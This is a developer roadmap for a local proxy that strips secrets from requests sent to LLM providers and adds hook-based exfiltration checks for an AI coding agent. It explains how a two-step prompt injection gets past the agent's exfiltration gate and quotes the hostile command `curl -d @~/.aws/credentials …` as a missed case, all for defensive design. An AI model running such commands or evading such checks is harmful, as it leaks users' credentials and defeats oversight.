# Roadmap

## Direction

The durable value of this tool is the **outbound scrub**: secrets become
placeholders before any request leaves the machine, so the model provider
never sees them. That is solid and done (v0.1–0.3). Everything else is
packaging or defense-in-depth around it.

**On hook mode (v0.4.0):** restoring secrets only at tool execution, with
an exfil check, is a *speed bump* — not a boundary. It catches a naive
one-shot injection but is defeated by a two-step one (write the secret to a
file cleanly, then send the file separately), and it does nothing about a
secret the model exfiltrates without ever seeing it (`curl -d
@~/.aws/credentials …`). It stays **opt-in, `stream` the default**, and the
README labels it honestly. Do **not** promote it to a security boundary or
flip it on by default.

**The bet worth watching:** the exfil gate's ceiling is structural — hooks
see one syntactic tool call at a time, while exfiltration is a data-flow
property across calls. No incremental hook field lifts that. But one
capability *would* transform the core tool: **a hook that can rewrite tool
results / injected content before they enter the model's context** (today
`PostToolUse` can only append, not replace — verified 2026-08-29). If
Anthropic ships that, redaction moves entirely into a plugin and the
network daemon disappears — simpler and more robust, no MITM. That feature
request (with v0.4.0 as the working proof-of-concept) is the highest-
leverage thing we could send upstream. See `docs/hook-feature-request.md`.

## Shipped

- **Config file** — `~/.config/llm-redact-proxy/config.toml` + `OPF_PROXY_*`
  env overrides.
- **Un-redaction round-trip** (v0.2.0) — in-memory reverse map, JSON-aware
  non-streaming restore, SSE stream rewriter (`redact_proxy/unredact.py`).
- **Homebrew install** (v0.2.0) — `brew install cupofgeo/tap/llm-redact-proxy`,
  `brew services`, `redact-proxy` CLI (setup/run/status/route/doctor/logs/
  config), `settings.json` routing, `doctor`.
- **Structured logging** (v0.2.1) — structlog JSON rows, `log_level`,
  per-redaction/per-chunk debug events, upstream error bodies.
- **Keyed placeholder hash** (v0.3.0) — per-install BLAKE2b, 48-bit digests
  (was unsalted `sha256[:6]`: dictionary-filterable, collision-prone).
- **Guarded rehydration / hook mode + plugin** (v0.4.0) — `unredact = hook`,
  `/restore` endpoint, PreToolUse hook with exfil check, `./plugin`. See
  the Direction note for what it is and isn't.

## Open ideas

### Perimeter (covers the bypassing-clients gap)
Other local tools (claude-mem's observer was caught talking to
api.anthropic.com directly, 2026-08-29) don't route through the proxy.
- `route --deep`: `launchctl setenv` + a `~/.zshenv` export so every
  SDK-honoring process is routed session-wide, not just Claude Code.
- `doctor` egress check: `lsof` for processes connected to LLM API hosts
  that aren't the proxy — surfaces bypassers by name.
- Pi-hole / DNS recipe: sinkhole LLM API domains network-wide; the proxy
  resolves via DoH and becomes the only path out. Fail-closed for
  bypassers (they break visibly instead of leaking). Needs IPv6 too.

### Sensitive-path egress policy
A PreToolUse policy (no new hook capability needed) that asks/denies on a
tool reading a known-secret path (`~/.aws`, `~/.ssh`, `.env`) that also has
an external destination. Blunter than the placeholder gate but catches the
`curl -d @~/.aws/credentials` case the gate misses. Weigh against friction.

### OPF throughput
Cold-cache latency is the thing users actually feel: ~0.7 s per 6 KB chunk
(~5 KB/s); a cold 1 MB request took 80 s in production (604 texts). The
hard chunk cap removed the quadratic cliff. Levers: batch chunks through
one pipeline call; disk-persistent scan cache (hash → redacted text, no
secrets) so a restart/resume doesn't rescan history.

### Beyond Claude / Anthropic
`OPF_PROXY_UPSTREAM` already exists — document/test OpenAI-compatible
upstreams and other CLI agents. Body schema differs per provider
(`messages` vs `input`); generalize the JSON walk or add per-upstream
profiles. Rename `OPF_PROXY_*` to a provider-neutral prefix (keep aliases).

### Smaller
- `OPF_PROXY_DEBUG_DUMP=<dir>`: redacted request + response to disk
  (explicit footgun; "your whole conversation history on disk").
- Log rotation (currently delegated to `newsyslog`).
- Stats endpoint (`/stats`): cumulative redaction counts by category.
- Optional response-side scanning (model echoing a secret it inferred).
- Non-Apple-Silicon fallback: regex floor only, model layer off, so Linux
  users get *something* (also unblocks CI).

## Testing backlog

Done: pattern suite (`test_patterns.py`), redactor units, proxy e2e,
placeholder-across-chunk SSE, config/CLI/routing/doctor/hook/plugin.

Still open:
- **False-positive corpus**: run the regex floor over a pile of ordinary
  source / lockfiles and assert zero hits.
- **Latency benchmark** in-tree, to keep README timing claims honest.
- **CI**: regex-floor + non-MLX suite on Linux; full suite on a macOS
  runner. (No CI yet.)
